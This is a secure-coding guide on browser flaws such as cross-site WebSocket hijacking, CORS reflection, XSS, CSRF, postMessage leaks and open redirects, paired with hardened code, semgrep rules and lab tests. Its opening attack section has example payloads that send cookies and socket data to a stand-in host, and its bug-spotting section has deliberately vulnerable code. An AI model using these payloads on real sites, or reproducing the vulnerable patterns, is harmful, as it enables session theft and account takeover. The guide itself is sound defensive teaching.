# The Browser Boundary: XSS, CSRF, Cross-Site WebSocket Hijacking, CORS, `postMessage`, Framing & Open Redirects

## 1. Attack Transcript

```text
# (a) Cross-Site WebSocket Hijacking (CSWSH): SameSite=Lax cookies are sent on WebSocket upgrades
#     from a page the attacker controls. WebSockets have no same-origin policy for the handshake.
<script> // served from https://evil.example
  const ws = new WebSocket("wss://app.example.com/realtime");   // victim's cookie rides along
  ws.onmessage = (m) => navigator.sendBeacon("https://evil.example/c", m.data);
  ws.onopen = () => ws.send(JSON.stringify({ op: "subscribe", channel: "billing" }));
</script>
server log: GET /realtime Upgrade: websocket  Origin: https://evil.example  Cookie: __Host-session=...   -> 101 Switching Protocols

# (b) CORS reflecting the Origin with credentials
$ curl -si https://api.example.com/api/me -H 'Origin: https://evil.example' -H "Cookie: $VICTIM"
HTTP/2 200
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
# evil.example's fetch(..., {credentials:"include"}) can now read the response.

# (c) Stored XSS via an "image" and a markdown field, served from the app's origin
$ curl -s -X POST .../api/comments -H "Cookie: $B" -d '{"body":"[x](javascript:fetch(`//evil.example/?c=`+document.cookie))"}'
$ curl -s -X POST .../api/upload -F 'file=@a.svg;type=image/png'    # <svg onload=...> served inline at /uploads/a.svg

# (d) Open redirect chained into token theft
https://app.example.com/login?next=//evil.example/phish      -> after login: 302 Location: //evil.example/phish
https://auth.example.com/authorize?...&redirect_uri=https://app.example.com/cb?next=https://evil.example   (code leaks via Referer / chained redirect)

# (e) postMessage with a wildcard
evil.example:  victimWindow.postMessage({type:"set-token", token:"x"}, "*")       # victim listener never checks event.origin
victim page:   parent.postMessage({session: secret}, "*")                         # any embedding page receives it

# (f) Clickjacking
<iframe src="https://app.example.com/settings/delete-account" style="opacity:0.0001; position:absolute"></iframe>
```

---

## 2. Spot the Bug

```typescript
// realtime.ts (Node + ws)
import { WebSocketServer } from "ws";
const wss = new WebSocketServer({ server });
wss.on("connection", (socket, req) => {
  const user = sessionFromCookie(req.headers.cookie);
  if (!user) return socket.close(4401);
  socket.on("message", (data) => handleCommand(user, JSON.parse(data.toString()), socket));
});
```

```typescript
// cors.ts
export function corsHeaders(req: Request): Headers {
  const h = new Headers();
  const origin = req.headers.get("origin");
  if (origin) {
    h.set("access-control-allow-origin", origin);
    h.set("access-control-allow-credentials", "true");
  }
  return h;
}
```

```typescript
// login.ts
export async function afterLogin(req: Request) {
  const next = new URL(req.url).searchParams.get("next") ?? "/";
  if (next.startsWith("/")) return Response.redirect(new URL(next, req.url), 302);
  return Response.redirect(new URL("/", req.url), 302);
}

// widget.ts (browser)
window.addEventListener("message", (e) => {
  if (e.data?.type === "render") container.innerHTML = e.data.html;
});
parent.postMessage({ type: "ready", session: sessionToken }, "*");

// store.ts
localStorage.setItem("access_token", token);
```

<details>
<summary>Reveal</summary>

1. The WebSocket upgrade authenticates with the cookie and never checks `Origin`: CSWSH. Any website the victim visits can open an authenticated socket and read or send as the victim.
2. CORS reflects any `Origin` and allows credentials: every site on the internet can read authenticated responses.
3. `next.startsWith("/")` accepts `//evil.example` and `/\evil.example` (protocol-relative / backslash host), so this is an open redirect. The `postMessage` listener does not check `e.origin` and assigns to `innerHTML` (DOM XSS); the `parent.postMessage(..., "*")` leaks the session to whoever embeds the page. A bearer token in `localStorage` is readable by any XSS or malicious dependency.

</details>

---

## 3. Invariant Violated & Mechanism

- **Invariant Violated:** `I4 — Context-Safe Boundary Parsing` (the browser is an interpreter of HTML/JS/URLs) with `I1 — Authentic Identity & Purpose Binding` (ambient cookie authority) (OWASP ASVS `v5.0.0-1.2.1`, `1.3.1`, `3.2.1`, `3.2.2`, `3.3.1`, `3.4.2`, `3.5.1`, `3.5.2`, `3.5.3`, `14.3.1`).
- **Mechanism:** the browser attaches ambient credentials (cookies) to requests initiated by *any* page, and executes script found in *any* response it believes belongs to your origin. Four families:
  1. **Script execution in your origin (XSS):** reflected, stored and DOM-based; via `innerHTML`/`dangerouslySetInnerHTML`, `javascript:` URLs, user-uploaded SVG/HTML, markdown/rich-text renderers, and **mutation XSS** (sanitized HTML that re-parses differently after being inserted into another context or after `innerHTML` round trips).
  2. **Cross-site requests with ambient authority:** CSRF on cookie-authenticated mutations, **CSWSH** on WebSocket upgrades, and CORS misconfiguration that lets another origin *read* responses.
  3. **Cross-window channels:** `postMessage` without origin checks; `window.opener` leaks; framing (clickjacking).
  4. **Redirect and navigation primitives:** open redirects that turn a trusted domain into a phishing or token-theft hop, especially in OAuth/OIDC flows.
- **Why Happy-Path Tests Miss It:** automated tests run same-origin, with no hostile page in the loop. A bug that requires `Origin: https://evil.example` or an attacker-controlled page does not exist in a test that only drives your own UI.

### Where It Hides

- Realtime/collab endpoints (`/ws`, `/realtime`, Socket.IO, Durable Object WebSocket handlers) that authenticate by cookie.
- Rich-text/markdown/comment/ticket rendering; admin dashboards that render user-supplied fields (stored XSS to a privileged viewer is privilege escalation).
- Upload/serving endpoints (`/uploads/*`, avatar and attachment routes) on the application origin.
- Shared CORS helpers, `Access-Control-Allow-Origin: *` with credentials-like behavior through a proxy, preflight handlers that echo `Access-Control-Request-Headers`.
- Login/logout/OAuth callbacks that accept `next`, `returnTo`, `redirect_uri`, `continue`.
- Embedded widgets, iframes, OAuth popups using `postMessage`.
- Auth tokens in `localStorage`/`sessionStorage`, or in URLs (`?token=`).

---

## 4. Hardened Pattern

### 4.1 Content Security Policy with nonces (defense in depth for XSS, framing and form hijack)

```typescript
export function buildCsp(nonce: string): string {
  return [
    "default-src 'self'",
    `script-src 'nonce-${nonce}' 'strict-dynamic'`, // no 'unsafe-inline', no host allowlists
    "style-src 'self' 'nonce-" + nonce + "'",
    "img-src 'self' data:",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    "frame-ancestors 'none'",                         // clickjacking: also send X-Frame-Options: DENY for legacy
    "upgrade-insecure-requests",
  ].join("; ");
}
// Per request: const nonce = base64(crypto.getRandomValues(new Uint8Array(16))); put it on every <script nonce>.
// Also: X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin,
// Cross-Origin-Opener-Policy: same-origin, Permissions-Policy with only what you use.
```

### 4.2 CSRF: Fetch-metadata first, Origin second, safe methods stay safe

```typescript
const SAFE_METHODS = new Set(["GET", "HEAD", "OPTIONS"]);

export function assertSameSiteMutation(req: Request, allowedOrigins: ReadonlySet<string>): void {
  if (SAFE_METHODS.has(req.method.toUpperCase())) return;
  if (!req.headers.get("cookie")) return; // no ambient credentials, nothing to forge

  const site = req.headers.get("sec-fetch-site");   // sent by all current browsers; unforgeable by page script
  if (site === "same-origin") return;
  if (site === "cross-site" || site === "same-site") throw forbidden("CSRF_FETCH_SITE");

  // Fallback for clients that do not send fetch metadata (old browsers, non-browser clients).
  const origin = req.headers.get("origin");
  if (!origin || !allowedOrigins.has(origin)) throw forbidden("CSRF_ORIGIN_MISMATCH");
}

function forbidden(code: string): Response {
  return new Response(JSON.stringify({ error: code }), {
    status: 403,
    headers: { "content-type": "application/json; charset=utf-8" },
  });
}
```

`same-site` (a sibling subdomain) is rejected for mutations on purpose: a compromised or takeover-able subdomain is otherwise a CSRF launchpad. Never mutate state on `GET` (`v5.0.0-3.5.3`). Cookies are `__Host-` prefixed, `Secure`, `HttpOnly`, `SameSite=Lax` (or `Strict` where flows allow) — see [`../auth-and-sessions/cookie-purpose-confusion-and-oidc.md`](../auth-and-sessions/cookie-purpose-confusion-and-oidc.md).

### 4.3 Cross-Site WebSocket Hijacking: authenticate the origin of the upgrade, not just the cookie

```typescript
import { WebSocketServer } from "ws";

const ALLOWED_WS_ORIGINS: ReadonlySet<string> = new Set(["https://app.example.com"]);

const wss = new WebSocketServer({
  server,
  verifyClient: ({ origin, req }, done) => {
    // 1. Origin allowlist: a browser always sends the true Origin of the page opening the socket.
    if (!origin || !ALLOWED_WS_ORIGINS.has(origin)) return done(false, 403, "origin");
    // 2. Authenticate (cookie) AFTER the origin gate.
    const user = sessionFromCookie(req.headers.cookie);
    if (!user) return done(false, 401, "auth");
    (req as any).user = user;
    done(true);
  },
});
```

Edge/Workers version: before `new WebSocketPair()`, `if (!ALLOWED_WS_ORIGINS.has(request.headers.get("origin") ?? "")) return new Response("Forbidden", { status: 403 })`. Even stronger: do not authenticate the socket with the ambient cookie at all; issue a short-lived, single-use ticket from an authenticated `POST` (CSRF-protected) and require it as the first message or a query parameter bound to the user and origin. Authorize every message against the same `TenantScope` as HTTP routes ([`../../strategy/scoped-db.md`](../../strategy/scoped-db.md)).

### 4.4 CORS: explicit allowlist, `Vary: Origin`, no credentials by default

```typescript
const CORS_ALLOWED: ReadonlyMap<string, { credentials: boolean }> = new Map([
  ["https://app.example.com", { credentials: true }],
  ["https://docs.example.com", { credentials: false }],
]);

export function corsHeaders(req: Request): Headers {
  const h = new Headers({ vary: "Origin" });
  const origin = req.headers.get("origin");
  const rule = origin ? CORS_ALLOWED.get(origin) : undefined; // exact string match; "null" is never allowed
  if (origin && rule) {
    h.set("access-control-allow-origin", origin);
    if (rule.credentials) h.set("access-control-allow-credentials", "true");
  }
  return h;
}
```

Never combine a reflected or wildcard origin with credentials. Do not validate with `endsWith(".example.com")`/`includes` (matches `evil-example.com`, `example.com.evil.net`).

### 4.5 `postMessage`: strict origin on both sides

```typescript
const PARENT_ORIGIN = "https://app.example.com";

window.addEventListener("message", (e: MessageEvent) => {
  if (e.origin !== PARENT_ORIGIN) return;                 // exact match; never e.origin.includes(...)
  if (e.source !== window.parent) return;
  const msg = MessageSchema.parse(e.data);                // validate shape; never trust fields
  if (msg.type === "render") container.textContent = msg.text; // text, not HTML
});

window.parent.postMessage({ type: "ready" }, PARENT_ORIGIN); // explicit targetOrigin, never "*"; never put secrets in messages
```

### 4.6 DOM and rich-text sinks

```typescript
import DOMPurify from "dompurify";

// Prefer text sinks: textContent / createTextNode / React JSX escaping (ASVS v5.0.0-3.2.2).
// When HTML is genuinely required (rich text), sanitize with an allowlist as the LAST step before insertion
// and insert once; never re-parse or concatenate sanitized output (mutation XSS).
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li", "code", "pre", "br"],
  ALLOWED_ATTR: ["href"],
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,         // blocks javascript: and data:
});
element.innerHTML = clean; // a single sink, same context it was sanitized for
```

Markdown: render with a pipeline that sanitizes after HTML generation (`rehype-sanitize` with a strict schema), disallow raw HTML, rewrite or proxy remote images, and add `rel="noopener noreferrer nofollow"` to external links. SVG: do not accept user SVG as an image; if unavoidable, serve it only as a download from the user-content origin and never inline.

### 4.7 Open redirects: resolve against your origin and compare

```typescript
export function safeRedirectTarget(next: string | null, selfOrigin: string): URL {
  const fallback = new URL("/", selfOrigin);
  if (!next || next.length > 2048) return fallback;
  let target: URL;
  try {
    target = new URL(next, selfOrigin);          // resolves "//evil.example" and "/\\evil.example" to their REAL host
  } catch {
    return fallback;
  }
  return target.origin === selfOrigin ? target : fallback;
}
```

OAuth/OIDC: `redirect_uri` must match a registered value by exact byte-for-byte comparison (`v5.0.0-10.4.1`); validate `state`, PKCE and `nonce` (see [`../auth-and-sessions/account-lifecycle-and-federation.md`](../auth-and-sessions/account-lifecycle-and-federation.md)).

### 4.8 User-content origin separation and token storage

- Serve user uploads and rendered user documents from a **separate registrable domain** (for example `example-usercontent.net`), not a subdomain of the application: cookies, `localStorage` and service workers are then unreachable, and a sibling-subdomain takeover cannot set cookies on the app. Add `Content-Disposition: attachment` for non-images, `nosniff`, and `Content-Security-Policy: sandbox`.
- Session credentials live in `HttpOnly; Secure; __Host-` cookies. Do not store bearer tokens in `localStorage`/`sessionStorage` (any XSS or dependency compromise reads them); never put tokens in URLs (`v5.0.0-14.2.1`); clear client state on logout (`v5.0.0-14.3.1`).

---

## 5. Residual Edge Cases (Why the Hardened Version Is Still Not Enough)

- **CSP is a seatbelt, not a fix:** `strict-dynamic` trusts scripts your nonce-bearing script loads; a vulnerable library or a DOM-clobbering gadget still runs. Fix the sink; keep CSP as containment. Report-only mode first, then enforce.
- **`Sec-Fetch-Site` is absent on non-browser clients and some older browsers:** the Origin fallback requires an exact allowlist match, and requests without either header on a cookie-authenticated mutation are rejected.
- **`same-site` is not `same-origin`:** sibling subdomains (staging, marketing, user-generated subdomains) share site. Treat subdomain takeover and dangling DNS as part of the CSRF/cookie boundary.
- **WebSockets:** a per-message authorization gap remains if you authenticate once at upgrade; revoked users keep their socket. Close sockets on revocation and recheck membership on subscribe operations (revocation SLO in [`../authorization-and-tenancy/cache-and-derived-data.md`](../authorization-and-tenancy/cache-and-derived-data.md)).
- **CORS preflight caching** (`Access-Control-Max-Age`) keeps a once-allowed origin allowed for the cache lifetime; keep it short.
- **Sanitizer drift:** DOMPurify and browser parsers evolve; pin versions, update promptly, and fuzz the exact sanitize-then-insert pipeline.
- **`target="_blank"` and `window.opener`:** add `noopener` (default in modern browsers, not in all embedded webviews).
- **Open redirects through other parameters:** `redirect_uri` registered patterns, `Referer`-based returns, `Location` built from `Host`.
- **Third-party scripts** (analytics, chat widgets) run with full origin privilege; isolate them in sandboxed iframes or load via a separate origin.
- **Prototype pollution / DOM clobbering** convert "no script" HTML injection into script execution through trusted gadgets.

---

## 6. How to Discover It Automatically

### A. Static

```yaml
# semgrep
rules:
  - id: html-sink-with-nonliteral
    languages: [typescript, javascript]
    severity: ERROR
    message: Raw HTML sink; use textContent or sanitize with an allowlist immediately before insertion
    pattern-either:
      - pattern: $EL.innerHTML = $X
      - pattern: $EL.outerHTML = $X
      - pattern: $EL.insertAdjacentHTML($P, $X)
      - pattern: document.write($X)
      - pattern: <$T dangerouslySetInnerHTML={{__html: $X}} />
  - id: postmessage-wildcard-or-no-origin-check
    languages: [typescript, javascript]
    severity: ERROR
    message: postMessage with "*" targetOrigin
    pattern: $W.postMessage($M, "*")
  - id: cors-reflected-origin
    languages: [typescript, javascript]
    severity: ERROR
    message: Access-Control-Allow-Origin derived from the request Origin
    pattern-either:
      - pattern: $H.set("access-control-allow-origin", $ORIGIN)
      - pattern: $RES.setHeader("Access-Control-Allow-Origin", $ORIGIN)
```

```bash
rg -n 'innerHTML|outerHTML|insertAdjacentHTML|dangerouslySetInnerHTML|document\.write|eval\(|new Function\(' src/
rg -n 'access-control-allow-origin|Access-Control-Allow-Credentials' src/ -i
rg -n 'new WebSocketServer|WebSocketPair|upgrade|io\.on\(.connection' src/        # then check each for an Origin gate
rg -n 'postMessage|addEventListener\(.message' src/
rg -n 'localStorage|sessionStorage' src/ | rg -i 'token|jwt|session|auth'
rg -n 'searchParams\.get\(.(next|returnTo|redirect|continue|url)' src/              # redirect sinks
rg -n -i 'frame-ancestors|x-frame-options|content-security-policy' src/            # absence is the finding
```

### B. Dynamic Attacker Test (lab: a second origin `https://evil.lab.test` that runs attacker scripts in a real browser)

1. **CSWSH:** from `evil.lab.test`, `new WebSocket("wss://app.lab.test/realtime")` with the victim's cookie present. Expect the upgrade to fail with `403`; zero frames received.
2. **CSRF matrix:** for every cookie-authenticated mutation, submit a cross-site `<form>` post (`application/x-www-form-urlencoded`, `text/plain`), a `fetch` with `mode: "no-cors"`, and a request with `Origin: https://evil.lab.test`. Expect `403`; DB-diff oracle shows no change ([`../../2-discovery-and-attacker-methods/deterministic-oracle-sweep.md`](../../2-discovery-and-attacker-methods/deterministic-oracle-sweep.md)).
3. **CORS:** `Origin: https://evil.lab.test`, `Origin: null`, `Origin: https://app.lab.test.evil.lab.test`, `Origin: https://evilapp.lab.test` → no `Access-Control-Allow-Origin` value reflecting them.
4. **XSS corpus:** inject a unique canary payload (`<img src=x onerror=...>`, `<svg onload>`, `javascript:` hrefs, mutation vectors, markdown link/image tricks) into every stored field; render in each viewer role (admin, member, guest) in a real browser; assert the canary callback never fires and the CSP report endpoint receives no violation.
5. **Redirects:** `next=//evil.lab.test`, `/\evil.lab.test`, `https:evil.lab.test`, `javascript:alert(1)`, encoded variants, and OAuth `redirect_uri` suffix/prefix variants → always same-origin fallback.
6. **Framing:** load every sensitive page inside an `<iframe>` from `evil.lab.test` → blocked by `frame-ancestors`.
7. **`postMessage`:** from `evil.lab.test`, send crafted messages to every message listener; listen for messages from your pages → nothing accepted, nothing leaked.
8. **User-content origin:** open an uploaded SVG/HTML directly → served from the separate domain with `nosniff`/sandbox; `document.cookie` of the app is empty there.

---

## 7. How to Eliminate the Bug Class by Construction

1. **Central security-header and CORS module:** one function sets CSP (nonce), `frame-ancestors`, `nosniff`, `Referrer-Policy`, COOP; CORS comes from a single allowlist `Map`. Lint any other `access-control-*` header.
2. **Router-level CSRF gate:** `assertSameSiteMutation` runs in the top-level router so endpoint authors never opt in; mutations on `GET` are a lint error.
3. **WebSocket upgrade is a registered, reviewed entry point:** a wrapper that refuses to upgrade without an origin allowlist check and a scoped actor; ticket-based auth where practical.
4. **Text-only rendering by default:** ban `innerHTML`/`dangerouslySetInnerHTML` outside a single `renderSanitizedHtml` function that owns the sanitize-then-insert pipeline.
5. **Typed message channels:** `postMessage` only through a wrapper that fixes `targetOrigin`, checks `origin` and `source`, and schema-validates payloads.
6. **One redirect function:** `safeRedirectTarget` is the only code allowed to build a `Location`.
7. **Separate origin for user content** and cookie-only session credentials; no tokens in web storage or URLs.
